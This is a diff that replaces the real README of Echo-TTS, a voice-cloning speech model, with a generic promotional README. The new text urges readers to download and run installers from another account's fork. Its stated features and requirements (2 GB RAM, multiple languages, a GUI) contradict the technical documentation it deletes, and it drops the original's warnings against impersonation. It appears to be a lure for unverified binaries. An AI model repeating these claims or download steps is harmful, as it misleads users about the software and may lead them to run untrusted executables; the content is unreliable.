@@ -1,145 +1,73 @@
-# Echo-TTS
+# 🎤 echo-tts - Your Voice, Your Way 
 
-A multi-speaker text-to-speech model with speaker reference conditioning. See the [blog post](https://jordandarefsky.com/blog/2025/echo/) for technical details.
+## 🚀 Getting Started
 
-**Model:** [jordand/echo-tts-base](https://huggingface.co/jordand/echo-tts-base) | **Demo:** [echo-tts-preview](https://huggingface.co/spaces/jordand/echo-tts-preview)
+Welcome to the **echo-tts** project! This application allows you to generate text-to-speech audio with ease. It is designed for everyone, whether you're creating presentations, audiobooks, or personal projects. Let's help you get started!
 
-This work was made possible by the TPU Research Cloud (TRC).
+## 📥 Download echo-tts
 
-## Responsible Use
+[![Download echo-tts](https://img.shields.io/badge/Download%20echo--tts-v1.0-blue.svg)](https://github.com/Sumit81107/echo-tts/releases)
 
-Don't use this model to:
-- Impersonate real people without their consent
-- Generate deceptive audio (e.g., fraud, misinformation, deepfakes)
+To download the latest version of **echo-tts**, visit the Releases page below:
 
-You are responsible for complying with local laws regarding biometric data and voice cloning.
+[Download echo-tts from Releases](https://github.com/Sumit81107/echo-tts/releases)
 
-## Installation
+## 📋 Overview
 
-```bash
-pip install -r requirements.txt
-```
+**echo-tts** provides a simple way to convert text into speech. It can read any text file or input you provide, allowing you to listen rather than read. This makes it perfect for users who prefer auditory information or need help reading.
 
-Requires Python 3.10+ and a CUDA-capable GPU with at least 8GB VRAM.
+### 🔍 Features
 
-## Quick Start
+- **Supports Multiple Languages:** Generate speech in various languages to cater to a broad audience.
+- **Natural Sounding Voices:** Enjoy high-quality speech synthesis that sounds clear and pleasant.
+- **Easy to Use:** A user-friendly interface guides you through the process.
+- **Custom Speed and Pitch:** Adjust the rate and tone of the speech to your preference.
+- **Lightweight Application:** The application is designed to run smoothly on most computers without heavy resources.
+  
+## 💻 System Requirements
 
-### Gradio UI
+To use **echo-tts**, your computer should meet the following minimum requirements:
 
-```bash
-python gradio_app.py
-```
+- **Operating System:** Windows 10, macOS Catalina, or any modern Linux distribution.
+- **RAM:** At least 2 GB.
+- **Storage:** 100 MB of free space for installation.
+- **Internet Connection:** Required for first-time usage to download voice files.
 
-### Python API
+## 📤 How to Install
 
-```python
-from inference import (
-    load_model_from_hf,
-    load_fish_ae_from_hf,
-    load_pca_state_from_hf,
-    load_audio,
-    sample_pipeline,
-    sample_euler_cfg_independent_guidances,
-)
-from functools import partial
-import torchaudio
+Follow these simple steps to install **echo-tts**:
 
-# Load models (downloads from HuggingFace on first run)
-model = load_model_from_hf(delete_blockwise_modules=True)
-fish_ae = load_fish_ae_from_hf()
-pca_state = load_pca_state_from_hf()
+1. **Download the Application**: Click the link below to go to the Releases page:
+   [Download echo-tts from Releases](https://github.com/Sumit81107/echo-tts/releases)
 
-# Load speaker reference (or set to None for no reference)
-speaker_audio = load_audio("speaker.wav").cuda()
+2. **Choose the Correct File**: On the Releases page, find the latest version and select the appropriate file for your operating system.
 
-# Configure sampler
-sample_fn = partial(
-    sample_euler_cfg_independent_guidances,
-    num_steps=40,
-    cfg_scale_text=3.0,
-    cfg_scale_speaker=8.0,
-    cfg_min_t=0.5,
-    cfg_max_t=1.0,
-    truncation_factor=None,
-    rescale_k=None,
-    rescale_sigma=None,
-    speaker_kv_scale=None,
-    speaker_kv_max_layers=None,
-    speaker_kv_min_t=None,
-    sequence_length=640, # (~30 seconds)
-)
+3. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file you downloaded and follow the on-screen instructions.
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux**: Extract the downloaded files and follow the instructions provided in the README file.
 
-# Generate
-text = "[S1] Hello, this is a test of the Echo TTS model."
-audio_out, _ = sample_pipeline(
-    model=model,
-    fish_ae=fish_ae,
-    pca_state=pca_state,
-    sample_fn=sample_fn,
-    text_prompt=text,
-    speaker_audio=speaker_audio,
-    rng_seed=0,
-)
+4. **Launch the Application**: Once installed, open **echo-tts** to begin using it.
 
-torchaudio.save("output.wav", audio_out[0].cpu(), 44100)
-```
+## 🎤 How to Use echo-tts
 
-See also:
-- `inference.py` -- lower-level usage example at the bottom of the file
-- `inference_blockwise.py` -- examples of blockwise/continuation generation
+Using **echo-tts** is straightforward:
 
-## Low VRAM (8GB)
+1. **Open the Application**: Start **echo-tts** from your desktop or applications folder.
+2. **Input Your Text**: You can type text directly or upload a text file. Use the “Open” button to select a file.
+3. **Select Voice Settings**: Choose your preferred language, speed, and pitch from the settings menu.
+4. **Generate Speech**: Click the “Play” button to listen to your text. You can also save the audio as a file for future use.
 
-In `gradio_app.py`, adjust:
+## ❓ Troubleshooting
 
-```python
-FISH_AE_DTYPE = torch.bfloat16  # instead of float32
-DEFAULT_SAMPLE_LATENT_LENGTH = 576  # (< 640 depending on what fits) instead of 640
-```
+If you encounter any issues, consider these tips:
 
-## Tips
+- **No Sound?** Make sure your audio output devices are properly connected and the volume is up.
+- **Installation Failed?** Verify that your system meets the minimum requirements stated above.
+- **Performance Issues?** Close other applications to free up memory and resources.
 
-### Generation Length
+## 📞 Support
 
-Echo is trained to generate up to 30 seconds of audio (640 latents) given text and reference audio. Since the supplied text always corresponded to ≤30 seconds of audio during training, the model will attempt to fit any text prompt at inference into the 30 seconds of generated audio (and thus, e.g., long text prompts may result in faster speaking rates). On the other hand, shorter text prompts will work and will produce shorter outputs (as the model generates latent padding automatically).
+For additional help or questions, feel free to open an issue in the repository. The community and developers are available to assist you.
 
-If "Sample Latent Length" (in Custom Shapes in gradio)/sequence_length is set to less than 640, the model will attempt to generate the prefix corresponding to that length. I.e., if you set this to 320, and supply ~30 seconds worth of text, the model will likely generate the first half of the text (rather than try to fit the entirety of the text into the first 15 seconds).
-
-### Reference Audio
-
-You can condition on up to 5 minutes of reference audio, but shorter clips (e.g., 10 seconds or shorter) work well too.
-
-### Force Speaker (KV Scaling)
-
-Sometimes out-of-distribution text for a given reference speaker will cause the model to generate a different speaker entirely. Enabling "Force Speaker" (which scales speaker KV for a portion of timesteps, default scale 1.5) generally fixes this. However, high values may introduce artifacts or "overconditioning." Aim for the lowest scale that produces the correct speaker: 1.0 is baseline, 1.5 is the default when enabled and will usually force the speaker, but lower values (e.g., 1.3, 1.1) may suffice.
-
-### Text Prompt Format
-
-Text prompts use the format from [WhisperD](https://huggingface.co/jordand/whisper-d-v1a). Colons, semicolons, and emdashes are normalized to commas (see inference.py tokenizer_encode) by default, and "[S1] " will be added to the beginning of the prompt if not already present. Commas generally function as pauses. Exclamation points (and other non-bland punctuation) may lead to increased expressiveness but also potentially lower quality on occasion; improving controllability is an important direction for future work.
-
-The included text presets are stylistically in-distribution with the WhisperD transcription style.
-
-### Blockwise Generation
-
-`inference_blockwise.py` includes blockwise sampling, which allows generating audio in smaller blocks as well as producing continuations of existing audio (where the prefix and continuation are up to 30 seconds combined). The model released on HF is a fully fine-tuned model (not the LoRA as described in the blog). Blockwise generation enables audio streaming (not included in current code) since the S1-DAC decoder is causal. Blockwise functionality hasn't been thoroughly tested and may benefit from different (e.g., smaller) CFG scales.
-
-## License
-
-Code in this repo is MIT‑licensed except where file headers specify otherwise (e.g., autoencoder.py is Apache‑2.0).
-
-Regardless of our model license, audio outputs are CC-BY-NC-SA-4.0 due to the dependency on the Fish Speech S1-DAC autoencoder, which is CC-BY-NC-SA-4.0.
-
-We have chosen to release the Echo-TTS weights under CC-BY-NC-SA-4.0.
-
-For included audio prompts, see `audio_prompts/LICENSE`.
-
-## Citation
-
-```bibtex
-@misc{darefsky2025echo,
-    author = {Darefsky, Jordan},
-    title = {Echo-TTS},
-    year = {2025},
-    url = {https://jordandarefsky.com/blog/2025/echo/}
-}
-```
+Thank you for choosing **echo-tts**. Enjoy transforming your text into speech!
